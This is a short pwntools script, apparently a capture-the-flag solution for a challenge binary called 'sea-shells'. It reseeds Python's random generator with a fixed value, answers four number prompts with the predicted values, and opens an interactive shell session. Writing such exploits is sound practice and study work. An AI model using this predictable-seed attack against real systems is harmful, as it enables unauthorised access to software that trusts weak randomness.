#!/usr/bin/python3
import random
from pwn import *

exe = ELF('sea-shells', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*vuln+328

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
random.seed(0x4068)
sla(b"1st number: ", str(random.random()))
sla(b"2nd number: ", str(random.random()))
sla(b"3rd number: ", str(random.random()))
sla(b"4th number: ", str(random.random()))


p.interactive()
